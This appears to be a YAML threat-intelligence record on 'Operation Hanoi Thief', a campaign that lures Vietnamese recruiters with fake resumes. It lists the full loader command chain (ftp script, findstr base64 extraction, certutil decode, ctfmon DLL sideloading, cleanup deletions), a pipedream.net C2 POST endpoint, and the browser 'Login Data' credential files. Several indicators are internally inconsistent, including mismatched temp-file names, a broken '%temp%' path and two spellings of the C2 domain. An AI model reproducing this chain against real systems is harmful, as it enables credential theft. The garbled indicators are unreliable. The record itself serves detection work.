description: Operation Hanoi Thief targets Vietnamese IT professionals and recruitment
  teams using fake resumes and LNK files to deliver a DLL implant named LOTUSHARVEST.
attribution: Chinese-origin threat actor
malware_families:
- LOTUSHARVEST
- MsCtfMonitor
TTPs:
  processes:
  - cmd.exe
  - ftp.exe
  - DeviceCredentialDeployment.exe
  - certutil.exe
  - ctfmon.exe
  - powershell.exe
  commandline:
  - /c ftp.exe -s:voffsec-certified-professional.png
  - /c copy offsec-certified-professional.png "C:\\ProgramData\\CV-Nguyen-Van-A.pdf"
  - /c explorer.exe C:\\ProgramData\\CV-Nguyen-Van-A.pdf
  - findstr /R "TVQQAAMAAAAEAAAA//BAAL" "offsec-certified-professional.png" >"C:\\ProgramData\\b64.tmp"
  - findstr /v /C:"findstr /R" "C:\\ProgramData\\be4.tmp" > "Stemp%\\b64.tmp"
  - move /Y %temp%\\b64.tmp "C:\\ProgramData\\be4.tmp">nul
  - certutil -decode C:\\ProgramData\\b64.tmp C:\\ProgramData\\MsCtfMonitor.dll
  - /c copy "C:\\Windows\\System32\\ctfmon.exe" "C:\\ProgramData\\ctfmon.exe"
  - /c start C:\\ProgramData\\ctfmon.exe
  - /c del C:\\ProgramData\\lala.exe
  - /c del C:\\ProgramData\\b64.tmp
  powershell: []
  scripting_engine:
  - batch
  registry_keys: []
  image_load:
  - MsCtfMonitor.dll
  network_connections:
  - ftp.exe -> attacker-controlled server
  - ctfmon.exe -> eol4hkm8mfoeevs.m.pipedream.net:443
  - InternetOpenA
  - eoldhkmgmfoeevs.m.pipedream.net
  - POST
  - /service
  - 'Content-Type: application/json'
  file_activity:
  - offsec-certified-professional.png
  - CV-Nguyen-Van-A.pdf
  - C:\\ProgramData\\lala.exe
  - C:\\ProgramData\\b64.tmp
  - C:\\ProgramData\\MsCtfMonitor.dll
  - C:\\ProgramData\\ctfmon.exe
  - C:\\Users\\%username%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login
    Data
  - C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\login
    Data
  persistence:
